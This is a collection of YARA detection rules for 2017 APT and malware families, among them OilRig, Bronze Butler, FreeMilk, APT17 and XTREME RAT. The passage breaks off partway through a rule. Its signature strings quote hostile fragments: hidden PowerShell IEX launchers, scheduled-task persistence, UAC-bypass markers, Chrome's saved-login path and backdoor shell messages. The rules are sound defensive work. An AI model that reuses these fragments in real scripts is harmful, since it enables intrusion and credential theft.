rule VBScript_Favicon_File_RID2F22 : APT DEMO FILE T1136 T1170 {
   meta:
      description = "VBScript cloaked as Favicon file used in Leviathan incident"
      author = "Florian Roth"
      reference = "https://goo.gl/MZ7dRg"
      date = "2017-10-18 11:44:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136, T1170"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "myxml = '<?xml version=\"\"1.0\"\" encoding=\"\"UTF-8\"\"?>';myxml = myxml +'<root>" ascii
      $x2 = ".Run \"taskkill /im mshta.exe" ascii
      $x3 = "<script language=\"VBScript\">Window.ReSizeTo 0, 0 : Window.moveTo -2000,-2000 :" ascii
      $s1 = ".ExpandEnvironmentStrings(\"%ALLUSERSPROFILE%\") &" fullword ascii
      $s2 = ".ExpandEnvironmentStrings(\"%temp%\") & " ascii
   condition: 
      filesize < 100KB and ( uint16 ( 0 ) == 0x733c and 1 of ( $x* ) ) or ( 3 of them )
} 

rule OilRig_Strings_Oct17_RID2E8D : APT DEMO G0049 MIDDLE_EAST T1136 {
   meta:
      description = "Detects strings from OilRig malware and malicious scripts"
      author = "Florian Roth"
      reference = "https://researchcenter.paloaltonetworks.com/2017/10/unit42-oilrig-group-steps-attacks-new-delivery-documents-new-injector-trojan/"
      date = "2017-10-18 11:19:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, G0049, MIDDLE_EAST, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "%localappdata%\\srvHealth.exe" fullword wide ascii
      $x2 = "%localappdata%\\srvBS.txt" fullword wide ascii
      $x3 = "Agent Injector\\PolicyConverter\\Inner\\obj\\Release\\Inner.pdb" fullword ascii
      $x4 = "Agent Injector\\PolicyConverter\\Joiner\\obj\\Release\\Joiner.pdb" fullword ascii
      $s3 = ".LoadDll(\"Run\", arg, \"C:\\\\Windows\\\\" ascii
   condition: 
      filesize < 800KB and 1 of them
} 

rule OilRig_ISMAgent_Campaign_Samples1_RID3372 : APT DEMO FILE G0049 MIDDLE_EAST T1136 {
   meta:
      description = "Detects OilRig malware from Unit 42 report in October 2017"
      author = "Florian Roth"
      reference = "https://goo.gl/JQVfFP"
      date = "2017-10-18 14:48:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0049, MIDDLE_EAST, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "###$$$TVqQAAMAAAAEAAAA" ascii
      $s2 = "C:\\Users\\J-Win-7-32-Vm\\Desktop\\error.jpg" fullword wide
      $s3 = "$DATA = [System.Convert]::FromBase64String([IO.File]::ReadAllText('%Base%'));[io.file]::WriteAllBytes(" ascii
      $s4 = " /c echo powershell > " fullword wide ascii
      $s5 = "\\Libraries\\servicereset.exe" fullword wide
      $s6 = "%DestFolder%" fullword wide ascii
   condition: 
      uint16 ( 0 ) == 0xcfd0 and filesize < 3000KB and 2 of them
} 

rule OilRig_ISMAgent_Campaign_Samples2_RID3373 : APT DEMO EXE FILE G0049 MIDDLE_EAST T1121 T1136 {
   meta:
      description = "Detects OilRig malware from Unit 42 report in October 2017"
      author = "Florian Roth"
      reference = "https://goo.gl/JQVfFP"
      date = "2017-10-18 14:48:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0049, MIDDLE_EAST, T1121, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "PolicyConverter.exe" fullword wide
      $x2 = "SrvHealth.exe" fullword wide
      $x3 = "srvBS.txt" fullword wide
      $s1 = "{a3538ba3-5cf7-43f0-bc0e-9b53a98e1643}, PublicKeyToken=3e56350693f7355e" fullword wide
      $s2 = "C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\RegAsm.exe" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and ( 2 of ( $x* ) or 3 of them )
} 

rule OilRig_ISMAgent_Campaign_Samples3_RID3374 : APT DEMO EXE FILE G0049 MIDDLE_EAST T1053 T1136 {
   meta:
      description = "Detects OilRig malware from Unit 42 report in October 2017"
      author = "Florian Roth"
      reference = "https://goo.gl/JQVfFP"
      date = "2017-10-18 14:48:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0049, MIDDLE_EAST, T1053, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $x1 = "cmd /c schtasks /query /tn TimeUpdate > NUL 2>&1" ascii
      $x2 = "schtasks /create /sc minute /mo 0002 /tn TimeUpdate /tr" fullword ascii
      $x3 = "-c  SampleDomain.com -m scheduleminutes" fullword ascii
      $x4 = ".ntpupdateserver.com" fullword ascii
      $x5 = ".msoffice365update.com" fullword ascii
      $s1 = "out.exe" fullword ascii
      $s2 = "\\Win32Project1\\Release\\Win32Project1.pdb" ascii
      $s3 = "C:\\windows\\system32\\cmd.exe /c (" fullword ascii
      $s4 = "Content-Disposition: form-data; name=\"file\"; filename=\"a.a\"" fullword ascii
      $s5 = "Agent configured successfully" fullword ascii
      $s6 = "\\runlog*" fullword ascii
      $s7 = "can not specify username!!" fullword ascii
      $s8 = "Agent can not be configured" fullword ascii
      $s9 = "%08lX%04hX%04hX%02hhX%02hhX%02hhX%02hhX%02hhX%02hhX%02hhX%02hhX" fullword ascii
      $s10 = "!!! can not create output file !!!" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and ( pe.imphash ( ) == "538805ecd776b9a42e71aebf94fde1b1" or pe.imphash ( ) == "861ac226fbe8c99a2c43ff451e95da97" or ( 1 of ( $x* ) or 3 of them ) )
} 

rule BronzeButler_Daserf_Delphi_1_RID31E8 : APT DEMO EXE FILE G0060 T1136 {
   meta:
      description = "Detects malware / hacktool sample from Bronze Butler incident"
      author = "Florian Roth"
      reference = "https://www.secureworks.com/research/bronze-butler-targets-japanese-businesses"
      date = "2017-10-14 13:42:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0060, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Services.exe" fullword ascii
      $s2 = "Mozilla/4.0 (compatible; MSIE 11.0; Windows NT 6.1; SV1)" fullword ascii
      $s3 = "l32.dll" fullword ascii
      $s4 = "tProcess:" fullword ascii
      $s5 = " InjectPr" ascii
      $s6 = "Write$Error creating variant or safe array\x1fInvalid argument to time encode" fullword wide
      $s7 = "on\\run /v " fullword ascii
      $s8 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\run" fullword ascii
      $s9 = "ms1ng2d3d2.exe" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 3 of them )
} 

rule BronzeButler_Daserf_C_1_RID2FD5 : APT DEMO EXE FILE G0060 T1136 {
   meta:
      description = "Detects malware / hacktool sample from Bronze Butler incident"
      author = "Florian Roth"
      reference = "https://www.secureworks.com/research/bronze-butler-targets-japanese-businesses"
      date = "2017-10-14 12:14:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0060, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $s1 = "(c) 2010 DYAMAR EnGineerinG, All rights reserved, http://www.dyamar.com." fullword ascii
      $s2 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; SV1)" fullword ascii
      $a1 = "ndkkwqgcm" fullword ascii
      $a2 = "RtlGetCo" fullword ascii
      $a3 = "hutils" fullword ascii
      $b1 = "%USERPROFILE%\\System" fullword ascii
      $b2 = "msid.dat" fullword ascii
      $b3 = "DRIVE_REMOTE" fullword wide
      $b4 = "%s%s%s%s%s%s%s%s%s%s%s%s" fullword ascii
      $b5 = "jcbhe.asp" fullword ascii
      $b6 = "edset.asp" fullword ascii
      $b7 = "bxcve.asp" fullword ascii
      $b8 = "hcvery.php" fullword ascii
      $b9 = "ynhkef.php" fullword ascii
      $b10 = "dkgwey.php" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and ( pe.imphash ( ) == "088382f4887e3b2c4bd5157f2d72b618" or all of ( $a* ) or 4 of them )
} 

rule BronzeButler_DGet_1_RID2E42 : APT DEMO EXE FILE G0060 T1136 {
   meta:
      description = "Detects malware / hacktool sample from Bronze Butler incident"
      author = "Florian Roth"
      reference = "https://www.secureworks.com/research/bronze-butler-targets-japanese-businesses"
      date = "2017-10-14 11:06:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0060, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "DGet Tool Made by XZ" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 10KB and 1 of them )
} 

rule BronzeButler_UACBypass_1_RID3029 : APT DEMO EXE FILE G0060 T1088 T1136 {
   meta:
      description = "Detects malware / hacktool sample from Bronze Butler incident"
      author = "Florian Roth"
      reference = "https://www.secureworks.com/research/bronze-butler-targets-japanese-businesses"
      date = "2017-10-14 12:28:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0060, T1088, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "\\Release\\BypassUacDll.pdb" ascii
      $x2 = "%programfiles%internet exploreriexplore.exe" fullword wide
      $x3 = "Elevation:Administrator!new:{3ad055" fullword wide
      $x4 = "BypassUac.pdb" fullword ascii
      $x5 = "[bypassUAC] started X64" fullword wide
      $x6 = "[bypassUAC] started X86" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 1 of them )
} 

rule BronzeButler_xxmm_1_RID2EA8 : APT DEMO EXE FILE G0060 T1136 {
   meta:
      description = "Detects malware / hacktool sample from Bronze Butler incident"
      author = "Florian Roth"
      reference = "https://www.secureworks.com/research/bronze-butler-targets-japanese-businesses"
      date = "2017-10-14 11:23:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0060, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "\\Release\\ReflectivLoader.pdb" ascii
      $x3 = "\\Projects\\xxmm2\\Release\\" ascii
      $x5 = "http://127.0.0.1/phptunnel.php" fullword ascii
      $s1 = "xxmm2.exe" fullword ascii
      $s2 = "\\AvUpdate.exe" fullword wide
      $s3 = "stdapi_fs_file_download" fullword ascii
      $s4 = "stdapi_syncshell_open" fullword ascii
      $s5 = "stdapi_execute_sleep" fullword ascii
      $s6 = "stdapi_syncshell_kill" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and ( 1 of ( $x* ) or 4 of them )
} 

rule BronzeButler_RarStar_1_RID2F9D : APT DEMO EXE FILE G0060 T1136 {
   meta:
      description = "Detects malware / hacktool sample from Bronze Butler incident"
      author = "Florian Roth"
      reference = "https://www.secureworks.com/research/bronze-butler-targets-japanese-businesses"
      date = "2017-10-14 12:04:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0060, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Mozilla/4.0+(compatible;+MSIE+8.0;+Windows+NT+6.0;+SV1)" fullword wide
      $s2 = "http://www.google.co.jp" fullword wide
      $s3 = "16D73E22-873D-D58E-4F42-E6055BC9825E" fullword ascii
      $s4 = "\\*.rar" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 2 of them )
} 

rule Saudi_Phish_Trojan_RID2E2F : DEMO EXE FILE MAL T1193 T1203 {
   meta:
      description = "Detects a trojan used in Saudi Aramco Phishing"
      author = "Florian Roth"
      reference = "https://goo.gl/Z3JUAA"
      date = "2017-10-12 11:03:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1193, T1203"
      minimum_yara = "1.7"
      
   strings:
      $s1 = { 7B 00 30 00 7D 00 7B 00 31 00 7D 00 5C 00 00 09
               2E 00 64 00 6C 00 6C 00 00 11 77 00 33 00 77 00
               70 00 2E 00 65 00 78 00 65 00 00 1B 61 00 73 00
               70 00 6E 00 65 00 74 00 5F 00 77 00 70 00 2E 00
               65 00 78 00 65 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and 1 of them )
} 

rule BKDR_Snarasite_Oct17_RID2E2A : DEMO EXE FILE MAL {
   meta:
      description = "Semiautomatically generated YARA rule"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-10-07 11:02:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and ( pe.imphash ( ) == "322bef04e1e1ac48875036e38fb5c23c" or pe.imphash ( ) == "15088754757513c92fa36ba5590e907b" )
} 

rule FreeMilk_APT_Mal_1_RID2D6D : APT DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects malware from FreeMilk campaign"
      author = "Florian Roth"
      reference = "https://researchcenter.paloaltonetworks.com/2017/10/unit42-freemilk-highly-targeted-spear-phishing-campaign/"
      date = "2017-10-05 10:31:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $x1 = "\\milk\\Release\\milk.pdb" ascii
      $x2 = "E:\\BIG_POOH\\Project\\" ascii
      $x3 = "Windows-KB271854-x86.exe" fullword wide
      $s1 = "Windows-KB275122-x86.exe" fullword wide
      $s2 = "\\wsatra.tmp" fullword wide
      $s3 = "%s\\Rar0tmpExtra%d.rtf" fullword wide
      $s4 = "\"%s\" help" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and ( pe.imphash ( ) == "108aa007b3d1b4817ff4c04d9b254b39" or 1 of ( $x* ) or 4 of them )
} 

rule FreeMilk_APT_Mal_2_RID2D6E : APT DEMO EXE FILE MAL T1113 T1136 {
   meta:
      description = "Detects malware from FreeMilk campaign"
      author = "Florian Roth"
      reference = "https://researchcenter.paloaltonetworks.com/2017/10/unit42-freemilk-highly-targeted-spear-phishing-campaign/"
      date = "2017-10-05 10:31:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1113, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $s1 = "failed to take the screenshot. err: %d" fullword ascii
      $s2 = "runsample" fullword wide
      $s3 = "%s%02X%02X%02X%02X%02X%02X:" fullword wide
      $s4 = "win-%d.%d.%d-%d" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and ( pe.imphash ( ) == "b86f7d2c1c182ec4c074ae1e16b7a3f5" or all of them )
} 

rule FreeMilk_APT_Mal_3_RID2D6F : APT DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects malware from FreeMilk campaign"
      author = "Florian Roth"
      reference = "https://researchcenter.paloaltonetworks.com/2017/10/unit42-freemilk-highly-targeted-spear-phishing-campaign/"
      date = "2017-10-05 10:31:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "CMD.EXE /C \"%s\"" fullword wide
      $s2 = "\\command\\start.exe" fullword wide
      $s3 = ".bat;.com;.cmd;.exe" fullword wide
      $s4 = "Unexpected failure opening HKCR key: %d" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 900KB and all of them )
} 

rule FreeMilk_APT_Mal_4_RID2D70 : APT DEMO EXE FILE MAL T1085 T1136 {
   meta:
      description = "Detects malware from FreeMilk campaign"
      author = "Florian Roth"
      reference = "https://researchcenter.paloaltonetworks.com/2017/10/unit42-freemilk-highly-targeted-spear-phishing-campaign/"
      date = "2017-10-05 10:31:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1085, T1136"
      required_modules = "pe"
      minimum_yara = "3.6.0"
      
   strings:
      $x1 = "base64Encoded=\"TVqQAAMAAAAE" ascii
      $s1 = "SOFTWARE\\Clients\\StartMenuInternet\\firefox.exe\\shell\\open\\command" fullword wide
      $s2 = "'Wscript.echo \"Base64 encoded: \" + base64Encoded" fullword ascii
      $s3 = "\\Google\\Chrome\\User Data\\Default\\Login Data" fullword ascii
      $s4 = "outFile=sysDir&\"\\rundll32.exe\"" fullword ascii
      $s5 = "set shell = WScript.CreateObject(\"WScript.Shell\")" fullword ascii
      $s6 = "command =outFile &\" sysupdate\"" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and ( ( pe.exports ( "getUpdate" ) and pe.number_of_exports == 1 ) or 1 of ( $x* ) or 3 of them )
} 

rule URL_File_Local_EXE_RID2D6E : DEMO SCRIPT T1064 T1136 {
   meta:
      description = "Detects an .url file that points to a local executable"
      author = "Florian Roth"
      reference = "https://twitter.com/malwareforme/status/915300883012870144"
      date = "2017-10-04 10:31:31"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, SCRIPT, T1064, T1136"
      minimum_yara = "2.2.0"
      
   strings:
      $s1 = "[InternetShortcut]" ascii wide fullword
      $s2 = /URL=file:\/\/\/C:\\[^\n]{1,50}\.exe/ 
   condition: 
      filesize < 400 and all of them
} 

rule CMStar_Malware_Sep17_RID2E52 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects CMStar Malware"
      author = "Florian Roth"
      reference = "https://goo.gl/pTffPA"
      date = "2017-10-03 11:09:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $s1 = "UpdateService.tmp" fullword ascii
      $s2 = "StateNum:%d,FileSize:%d" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and ( pe.imphash ( ) == "22021985de78a48ea8fb82a2ff9eb693" or pe.exports ( "WinCred" ) or all of them )
} 

rule APT17_Malware_Oct17_1_RID2E03 : APT DEMO EXE FILE G0025 MAL T1136 {
   meta:
      description = "Detects APT17 malware"
      author = "Florian Roth"
      reference = "https://goo.gl/puVc9q"
      date = "2017-10-03 10:56:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0025, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "\\spool\\prtprocs\\w32x86\\localspl.dll" fullword ascii
      $s2 = "\\spool\\prtprocs\\x64\\localspl.dll" fullword ascii
      $s3 = "\\msvcrt.dll" fullword ascii
      $s4 = "\\TSMSISrv.dll" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and all of them )
} 

rule APT17_Malware_Oct17_2_RID2E04 : APT DEMO EXE FILE G0025 MAL T1136 {
   meta:
      description = "Detects APT17 malware"
      author = "Florian Roth"
      reference = "https://goo.gl/puVc9q"
      date = "2017-10-03 10:56:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0025, MAL, T1136"
      required_modules = "pe"
      minimum_yara = "3.0.0"
      
   strings:
      $x1 = "Cookie: __xsptplus=%s" fullword ascii
      $x2 = "http://services.fiveemotions.co.jp" fullword ascii
      $x3 = "http://%s/ja-JP/2015/%d/%d/%d%d%d%d%d%d%d%d.gif" fullword ascii
      $s1 = "FoxHTTPClient_EXE_x86.exe" fullword ascii
      $s2 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.3072" ascii
      $s3 = "hWritePipe2 Error:%d" fullword ascii
      $s4 = "Not Support This Function!" fullword ascii
      $s5 = "Global\\PnP_No_Management" fullword ascii
      $s6 = "Content-Type: image/x-png" fullword ascii
      $s7 = "Accept-Language: ja-JP" fullword ascii
      $s8 = "IISCMD Error:%d" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and ( pe.exports ( "_foo@0" ) or 1 of ( $x* ) or 6 of them )
} 

rule APT17_Unsigned_Symantec_Binary_EFA_RID338C : APT DEMO EXE FILE G0025 T1136 {
   meta:
      description = "Detects APT17 malware"
      author = "Florian Roth"
      reference = "https://goo.gl/puVc9q"
      date = "2017-10-03 14:52:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0025, T1136"
      required_modules = "pe"
      minimum_yara = "3.0.0"
      
   strings:
      $s1 = "Copyright (c) 2007 - 2011 Symantec Corporation" fullword wide
      $s2 = "\\\\.\\SYMEFA" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them and pe.number_of_signatures == 0 )
} 

rule APT17_Malware_Oct17_Gen_RID2EEC : APT DEMO EXE FILE G0025 GEN MAL T1136 {
   meta:
      description = "Detects APT17 malware"
      author = "Florian Roth"
      reference = "https://goo.gl/puVc9q"
      date = "2017-10-03 11:35:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0025, GEN, MAL, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $x1 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NETCLR 2.0.50727)" fullword ascii
      $x2 = "http://%s/imgres?q=A380&hl=en-US&sa=X&biw=1440&bih=809&tbm=isus&tbnid=aLW4-J8Q1lmYBM" ascii
      $s1 = "hWritePipe2 Error:%d" fullword ascii
      $s2 = "Not Support This Function!" fullword ascii
      $s3 = "Cookie: SESSIONID=%s" fullword ascii
      $s4 = "http://0.0.0.0/1" fullword ascii
      $s5 = "Content-Type: image/x-png" fullword ascii
      $s6 = "Accept-Language: en-US" fullword ascii
      $s7 = "IISCMD Error:%d" fullword ascii
      $s8 = "[IISEND=0x%08X][Recv:] 0x%08X %s" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( pe.imphash ( ) == "414bbd566b700ea021cfae3ad8f4d9b9" or 1 of ( $x* ) or 6 of them ) )
} 

rule redSails_EXE_RID2B89 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Detects Red Sails Hacktool by WinDivert references"
      author = "Florian Roth"
      reference = "https://github.com/BeetleChunks/redsails"
      date = "2017-10-02 09:10:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "bWinDivert64.dll" fullword ascii
      $s2 = "bWinDivert32.dll" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 6000KB and all of them )
} 

rule redSails_PY_RID2B50 : DEMO HKTL T1136 {
   meta:
      description = "Detects Red Sails Hacktool - Python"
      author = "Florian Roth"
      reference = "https://github.com/BeetleChunks/redsails"
      date = "2017-10-02 09:01:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Gained command shell on host" fullword ascii
      $x2 = "[!] Received an ERROR in shell()" fullword ascii
      $x3 = "Target IP address with backdoor installed" fullword ascii
      $x4 = "Open backdoor port on target machine" fullword ascii
      $x5 = "Backdoor port to open on victim machine" fullword ascii
   condition: 
      1 of them
} 

rule Susp_PowerShell_Sep17_1_RID2F9F : DEMO SCRIPT T1064 T1086 T1136 {
   meta:
      description = "Detects suspicious PowerShell script in combo with VBS or JS "
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-09-30 12:05:01"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, SCRIPT, T1064, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Process.Create(\"powershell.exe -nop -w hidden" fullword ascii nocase
      $x2 = ".Run\"powershell.exe -nop -w hidden -c \"\"IEX " ascii
      $s1 = "window.resizeTo 0,0" fullword ascii
   condition: 
      ( filesize < 2KB and 1 of them )
} 

rule Susp_PowerShell_Sep17_2_RID2FA0 : DEMO FILE SCRIPT T1064 T1086 T1136 {
   meta:
      description = "Detects suspicious PowerShell script in combo with VBS or JS "
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-09-30 12:05:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, SCRIPT, T1064, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = ".Run \"powershell.exe -nop -w hidden -e " ascii
      $x2 = "FileExists(path + \"\\..\\powershell.exe\")" fullword ascii
      $x3 = "window.moveTo -4000, -4000" fullword ascii
      $s1 = "= CreateObject(\"Wscript.Shell\")" fullword ascii
   condition: 
      filesize < 20KB and ( ( uint16 ( 0 ) == 0x733c and 1 of ( $x* ) ) or 2 of them )
} 

rule Xtreme_Sep17_2_RID2C06 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects XTREME sample analyzed in September 2017"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-09-27 09:31:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Spy24.exe" fullword wide
      $s2 = "Remote Service Application" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and all of them )
} 

rule Xtreme_Sep17_3_RID2C07 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects XTREME sample analyzed in September 2017"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-09-27 09:31:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "Keylogg" fullword ascii
      $s4 = "XTREME" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 700KB and all of them )
} 

rule Xtreme_Sep17_1_RID2C05 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects XTREME sample analyzed in September 2017"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-09-27 09:31:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $x1 = "ServerKeyloggerU" fullword ascii
      $x2 = "TServerKeylogger" fullword ascii
      $x3 = "XtremeKeylogger" fullword wide
      $x4 = "XTREMEBINDER" fullword wide
      $s1 = "shellexecute=" fullword wide
      $s2 = "[Execute]" fullword wide
      $s3 = ";open=RECYCLER\\S-1-5-21-1482476501-3352491937-682996330-1013\\" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 4000KB and ( pe.imphash ( ) == "735af2a144f62c50ba8e89c1c59764eb" or ( 1 of ( $x* ) or 3 of them ) )
} 

rule Xtreme_RAT_Gen_Imp_RID2DCA : DEMO EXE FILE GEN MAL {
   meta:
      description = "Detects XTREME sample analyzed in September 2017"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-09-27 10:46:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, GEN, MAL"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and ( pe.imphash ( ) == "d0bdf112886f3d846cc7780967d8efb9" or pe.imphash ( ) == "cc6f630f214cf890e63e899d8ebabba6" or pe.imphash ( ) == "e0f7991d50ceee521d7190effa3c494e" )
} 

rule Microcin_Sample_1_RID2D96 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Malware sample mentioned in Microcin technical report by Kaspersky"
      author = "Florian Roth"
      reference = "https://securelist.com/files/2017/09/Microcin_Technical-PDF_eng_final.pdf"
      date = "2017-09-26 10:38:11"
      score = 75
